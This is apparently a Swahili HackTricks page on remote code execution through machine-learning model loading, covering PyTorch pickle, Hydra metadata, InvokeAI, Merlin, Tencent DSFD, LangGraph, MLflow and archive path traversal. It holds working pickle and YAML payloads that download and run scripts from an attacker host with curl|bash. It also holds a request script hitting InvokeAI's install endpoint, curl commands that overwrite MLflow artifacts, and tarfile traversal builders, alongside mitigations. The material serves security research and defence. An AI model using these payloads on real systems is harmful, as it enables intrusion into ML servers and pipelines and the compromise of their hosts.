# RCE kupitia Modeli

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli hadi RCE

Modeli za Machine Learning kwa kawaida hushirikiwa katika fomati tofauti, kama vile ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za developers au mifumo ya production ili zitumike. Kwa kawaida modeli hazipaswi kuwa na code hasidi, lakini kuna hali ambapo modeli inaweza kutumiwa kutekeleza code kiholela kwenye mfumo kama kipengele kilichokusudiwa, au kutokana na udhaifu katika library ya kupakia modeli.

Jedwali lifuatalo linaorodhesha udhaifu wa mfano katika kundi hili:

| **Framework / Zana**        | **Udhaifu (CVE ikiwa inapatikana)**                                                    | **Njia ya RCE**                                                                                                                           | **Marejeleo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Udeserialization usio salama katika* `torch.load` **(CVE-2025-32434)**                                                              | Pickle hasidi katika checkpoint ya modeli husababisha utekelezaji wa code (kwa kukwepa ulinzi wa `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hasidi husababisha utekelezaji wa code; RCE kupitia Java deserialization katika management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Udeserialization usio salama wa checkpoint kupitia `torch.load` **(CVE-2025-23298)**                                           | Checkpoint isiyoaminika huanzisha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → utekelezaji wa code katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook isiyo salama ya kiendelezi cha MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ufunguo wa `filter` unaodhibitiwa na mtumiaji huingiza sintaksia ya SQL/JSON-path, `UNION SELECT` hutengeneza rekodi bandia ya checkpoint, kisha udeserialization ya `msgpack` huimport na kuita code ya Python iliyochaguliwa na mshambuliaji | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML isiyo salama) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML hutumia `yaml.unsafe_load` (utekelezaji wa code) <br> Kupakia modeli yenye layer ya **Lambda** huendesha code ya Python kiholela          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (uchakataji wa TFLite)                                                                                          | Modeli ya `.tflite` iliyoundwa mahsusi husababisha integer overflow → uharibifu wa heap (uwezekano wa RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` huendesha pickle yenye payload ya `__reduce__` ya mshambuliaji                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` isiyo salama) *imepingwa*                                                                              | `numpy.load` iliruhusu kwa chaguo-msingi object arrays zilizopicklewa – `.npy/.npz` hasidi husababisha utekelezaji wa code                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Njia ya external-weights ya modeli ya ONNX inaweza kutoka nje ya directory (kusoma faili kiholela) <br> Tar ya modeli ya ONNX hasidi inaweza kubatilisha faili kiholela (na kusababisha RCE) | |
| ONNX Runtime (hatari ya usanifu)  | *(Hakuna CVE)* ONNX custom ops / control flow                                                                                    | Modeli yenye operator maalum huhitaji kupakia code asilia ya mshambuliaji; grafu changamano za modeli hutumia vibaya mantiki ili kutekeleza hesabu zisizokusudiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia API ya kupakia modeli huku `--model-control` ikiwa imewashwa huruhusu path traversal ya relative ili kuandika faili (k.m., kubatilisha `.bashrc` kwa RCE)    | |
| **GGML (fomati ya GGUF)**      | **CVE-2024-25664 … 25668** (heap overflows nyingi)                                                                         | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflows katika parser, na kuwezesha utekelezaji wa code kiholela kwenye mfumo wa mwathiriwa                     | |
| **Keras (fomati za zamani)**   | *(Hakuna CVE mpya)* Modeli ya zamani ya Keras H5                                                                                         | Modeli hasidi ya HDF5 (`.h5`) yenye layer ya Lambda bado hutekeleza code inapopakiwa (Keras safe_mode haijumuishi fomati za zamani – “downgrade attack”) | |
| **Nyingine** (kwa ujumla)        | *Kasoro ya usanifu* – Userialishaji wa Pickle                                                                                         | Zana nyingi za ML (k.m., fomati za modeli zinazotumia pickle, Python `pickle.load`) zitatekeleza code kiholela iliyopachikwa kwenye faili za modeli isipokuwa hatua za kuzuia zichukuliwe | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata isiyoaminika inayopitishwa kwa `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config ya modeli inayodhibitiwa na mshambuliaji huweka `_target_` kuwa callable yoyote (k.m., `builtins.exec`) → hutekelezwa wakati wa kupakia, hata kwa fomati “salama” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna modeli za Python zinazotumia pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), ambazo zinaweza kutumiwa kutekeleza code kiholela kwenye mfumo ikiwa hazijapakiwa kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotumia pickle inaweza kuathiriwa hasa na aina hii ya mashambulizi, hata kama haijaorodheshwa kwenye jedwali hapo juu.

### Metadata ya Hydra → RCE (hufanya kazi hata kwa safetensors)

`hydra.utils.instantiate()` huimport na kuita `_target_` yoyote ya dotted iliyo kwenye object ya configuration/metadata. Libraries kama Hugging Face Transformers zinapopitisha **metadata ya modeli isiyoaminika** kwa `instantiate()`, mshambuliaji anaweza kutoa callable na arguments ambazo huendeshwa mara moja wakati wa kupakia modeli (hakuna pickle inayohitajika).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Mfano wa payload (hufanya kazi katika `model_config.yaml` ya `.nemo`, `config.json` ya repo, au `__metadata__` ndani ya `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Mambo muhimu:
- Hutekelezwa kabla ya uanzishaji wa modeli katika `restore_from/from_pretrained` ya NeMo, coders za HuggingFace za uni2TS, na loaders za FlexTok.
- Orodha ya kuzuia ya string ya Hydra inaweza kukwepwa kupitia njia mbadala za import (kwa mfano, `enum.bltns.eval`) au majina yanayotatuliwa na programu (kwa mfano, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok pia huchanganua metadata iliyogeuzwa kuwa string kwa kutumia `ast.literal_eval`, na hivyo kuruhusu DoS (kuongezeka kupita kiasi kwa matumizi ya CPU/memory) kabla ya mwito wa Hydra.

### 🆕  InvokeAI RCE kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni kiolesura maarufu cha wavuti cha open-source cha Stable-Diffusion. Matoleo **5.3.1 – 5.4.2** hufichua endpoint ya REST `/api/v2/models/install`, inayowaruhusu watumiaji kupakua na kupakia modeli kutoka kwa URL zozote.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kupachika object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye seva ya InvokeAI.

Athari hii ilipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa Exploitation

1. Unda checkpoint hasidi:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Host `payload.ckpt` kwenye HTTP server unayoidhibiti (kwa mfano, `http://ATTACKER/payload.ckpt`).
3. Washa endpoint iliyo hatarini (hakuna uthibitishaji unaohitajika):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI inapopakua faili, huita `torch.load()` → gadget ya `os.system` huendeshwa na mshambuliaji hupata utekelezaji wa msimbo katika muktadha wa mchakato wa InvokeAI.

Exploit iliyo tayari kutumika: moduli ya **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` huendesha mtiririko mzima kiotomatiki.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (bendera ya scan ni **false** kwa chaguomsingi)
•  `/api/v2/models/install` inaweza kufikiwa na mshambuliaji
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Hatua za kupunguza hatari

* Boresha hadi **InvokeAI ≥ 5.4.3** – kiraka huweka `scan=True` kwa chaguomsingi na huchanganua malware kabla ya deserialization.<sup>[[2]](#references)</sup>
* Unapopakia checkpoints kupitia programu, tumia `torch.load(file, weights_only=True)` au helper mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza orodha za vyanzo vinavyoruhusiwa / sahihi za dijitali kwa vyanzo vya modeli, na endesha huduma kwa ruhusa za chini kabisa.

> ⚠️ Kumbuka kwamba fomati **yoyote** inayotegemea Python pickle (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) si salama kiasili ku-deserialize kutoka vyanzo visivyoaminika.

---

Mfano wa hatua ya kupunguza hatari ya muda ikiwa ni lazima uendelee kutumia matoleo ya zamani ya InvokeAI nyuma ya reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilikuwa na loader ya checkpoint isiyo salama iliyokuwa ikiita moja kwa moja `torch.load()` kwenye njia zilizotolewa na mtumiaji. Kwa kuwa `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza msimbo wowote kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Njia iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii husababisha RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hiyo hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, hutekelezwa kabla ya weights yoyote kutumiwa.

Mfano mfupi wa checkpoint hasidi:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vekta za uwasilishaji na wigo wa athari:
- Checkpoint/model zilizowekewa Trojan na kushirikiwa kupitia repos, buckets au artifact registries
- Pipeline za resume/deploy za kiotomatiki zinazopakia checkpoint kiotomatiki
- Utekelezaji hufanyika ndani ya workers za training/inference, mara nyingi zikiwa na ruhusa za juu (kwa mfano, root ndani ya containers)

Suluhisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha matumizi ya moja kwa moja ya `torch.load()` na deserializer yenye vizuizi na orodha ya vitu vinavyoruhusiwa, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya huthibitisha aina/fields na huzuia callable zisizoruhusiwa kutekelezwa wakati wa kupakia.<sup>[[7]](#references)</sup>

Mwongozo wa kujilinda mahususi kwa checkpoint za PyTorch:
- Usifanye unpickle data isiyoaminika. Pendelea formats zisizoweza kutekeleza code kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa ni lazima utumie serialization ya PyTorch, hakikisha `weights_only=True` (inayotumika katika matoleo mapya ya PyTorch) au tumia unpickler maalum yenye orodha ya vitu vinavyoruhusiwa, inayofanana na patch ya Transformers4Rec.<sup>[[4]](#references)</sup>
- Thibitisha chanzo/saini za model na weka deserialization ndani ya sandbox (seccomp/AppArmor; mtumiaji asiye root; FS yenye vizuizi na bila muunganisho wa mtandao unaotoka).
- Fuatilia michakato-tanzu isiyotarajiwa inayoanzishwa na huduma za ML wakati checkpoint inapopakiwa; fuatilia matumizi ya `torch.load()`/`pickle`.

Marejeleo ya POC na matoleo hatarishi/yaliyotiwa patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader hatarishi ya kabla ya patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC ya checkpoint hasidi: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ya baada ya patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Mfano – kuunda model hasidi ya PyTorch

- Unda model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Pakia modeli:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD ya Tencent ina endpoint ya `resnet` inayofanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa apakie ukurasa/faili hasidi, kuisababisha itume blob iliyosanifishwa kwa njia iliyoundwa mahsusi kwenye endpoint hiyo, na kuchochea deserialization kama `root`, na hivyo kusababisha mfumo kuathirika kikamilifu.

Mtiririko wa exploit unafanana na matumizi mabaya ya kawaida ya pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) inaweza kutumiwa kama silaha kwa njia ileile, bila kujali kama data ilisafirishwa kupitia HTTP, WebSocket, au faili iliyowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Mnyororo huu wa mashambulizi unavutia kwa sababu mshambuliaji **hahitajiki kupakia faili hasidi ya model**. Badala yake, programu hufichua **API ya persistence ya AI-agent** (`get_state_history(..., filter=...)`), na ingizo la mtumiaji hufika kwenye query builder ya checkpointer.

#### 1. SQLi ya kimuundo katika metadata filters

Muundo hatari wa SQLite ulionekana hivi:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Thamani hufungwa baadaye, lakini `query_key` huunganishwa kwenye **mfuatano wa JSON path**, kwa hivyo `'` ndani ya ufunguo wa dictionary hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hili pia linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na sehemu za TTL**: placeholders hulinda thamani pekee, si sintaksia ya muundo wa query.

#### 2. `UNION SELECT` inaweza kulenga sinks za baadaye, si kuiba data tu

Query hurejesha `type` na byte za `checkpoint` zilizofanywa serialized, ambazo baadaye hutumiwa kama:

```python
self.serde.loads_typed((type, checkpoint))
```

Hiyo ina maana kwamba SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu bandia ya matokeo**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ikiwa baadaye msimbo wowote utachanganua, kuondoa serialization, kuandika au kutekeleza safu wima iliyochaguliwa, linganisha safu wima hizo na sinks zake. Katika hali hii, safu ghushi hugeuza SQLi kuwa **uondoaji wa serialization unaodhibitiwa na mshambuliaji**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia extension hook maalum iliyofungua tuple iliyopachikwa na kutekeleza:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Kwa hiyo, MessagePack extension object inayosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` hu-import `os`, hutatua `system`, na kuendesha amri. Unapokagua AI frameworks, chunguza **custom MessagePack/JSON/pickle revivers** ili kubaini dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa ukaguzi wa vitendo kwa agent frameworks

Kagua ingizo lolote linalodhibitiwa na mtumiaji linalofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha vipande vya SQL au Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini rows zinazorejeshwa na persistence layer

Mnyororo huu mahususi uliathiri deployments za LangGraph zinazojisimamia zenye SQLite au Redis checkpointers, pale ambapo watumiaji wasioaminika wangeweza kudhibiti `filter`. Matoleo yaliyorekebishwa yaliyoainishwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc: kubadilisha artifact na kusababisha pickle RCE

MLflow PyFunc iliyoundwa kutoka kwa `PythonModel` inaweza kuhifadhi object iliyoserialishwa kama `python_model.pkl`. Metadata ya model hutaja `mlflow.pyfunc.model` kama loader yake, na utekelezaji wa MLflow hutumia jina hili la faili kwa Python model iliyohifadhiwa. Kwa hiyo, ruhusa ya kuandika kwenye artifact store inaweza kusababisha code execution katika application tofauti inayopakia model hiyo baadaye.<sup>[[17]](#references)[[18]](#references)</sup>

Mnyororo muhimu ni **ruhusa ya kuandika artifact → badilisha pickle → fanya inference consumer ipakie tena**. Kwa experiment inayotumia root ya proxied `mlflow-artifacts:/...`, orodhesha experiment, run, na njia ya model artifact. Tracking server hutoa `GET` na `PUT` kwenye `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Reducer ndogo inaweza kutekeleza command mara tu consumer anapo-unpickle artifact. Kutengeneza payload kwa kutumia toleo la Python lililotajwa kwenye `MLmodel` huepusha matatizo ya uoanifu.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Anzisha operesheni inayopakia modeli iliyopo, kama vile prediction, scoring au deployment. Usifanye retrain kwanza, kwa sababu training inaweza kubadilisha artifact hasidi na kuweka modeli mpya. Hitilafu ya programu haimaanishi kuwa exploit haikufaulu: reducer hurejesha hali ya kutoka kwa amri kama nambari kamili badala ya modeli inayoweza kutumika. Anza na athari inayoonekana, kama ICMP au HTTP callback, kisha ibadilishe na payload ya mwisho.<sup>[[20]](#references)</sup>

Wakati wa assessment, tofautisha ruhusa ya kuunda run na ruhusa ya kubadilisha artifacts za run nyingine. Kagua authentication na ruhusa za kusasisha kwa kila run, chunguza mabadiliko yasiyotarajiwa ya `python_model.pkl`, na uchukulie asili na uadilifu wa modeli kuwa sehemu ya mpaka wa utekelezaji. Msimbo wa sasa wa MLflow pia unaunga mkono kuweka `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` na unapendekeza kutumia artifacts za models-from-code badala ya kupakia data ya cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modeli hadi Path Traversal

Kama ilivyotajwa katika [**chapisho hili la blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), miundo mingi ya modeli inayotumiwa na frameworks mbalimbali za AI hutegemea archive, kwa kawaida `.zip`. Kwa hiyo, huenda ikawezekana kutumia vibaya miundo hii kufanya mashambulizi ya Path Traversal, yanayoruhusu kusoma faili zozote kutoka kwenye mfumo ambako modeli inapakiwa.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia msimbo ufuatao unaweza kuunda modeli itakayounda faili kwenye saraka ya `/tmp` inapopakiwa:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Au, kwa kutumia msimbo ufuatao unaweza kuunda modeli ambayo itaunda symlink inayoelekeza kwenye saraka ya `/tmp` inapopakiwa:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Uchambuzi wa kina: Keras .keras deserialization na utafutaji wa gadget

Kwa mwongozo mahususi kuhusu mambo ya ndani ya .keras, RCE ya Lambda-layer, suala la arbitrary import katika ≤ 3.8, na ugunduzi wa gadget baada ya marekebisho ndani ya allowlist, tazama:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blogu ya OffSec – "CVE-2024-12029 – InvokeAI Deserialization ya Data Isiyoaminika"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Nyaraka za moduli ya Metasploit ya Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – mambo ya usalama ya torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blogu ya ZDI – CVE-2025-23298: Kupata Remote Code Execution katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Ushauri wa ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader hatarishi kabla ya patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC ya checkpoint hasidi (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader baada ya patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution kupitia fomati na maktaba za kisasa za AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Utafiti wa Check Point – Kutoka SQLi hadi RCE: Kutumia Checkpointer ya LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Kubadilisha mwelekeo kutoka Archive Slip Bugs hadi zawadi za AI/ML zenye thamani kubwa](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Ushauri wa Snyk na uthibitisho wa dhana wa PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Chanzo cha MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – endpoints za kupakua na kupakia artifacts](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
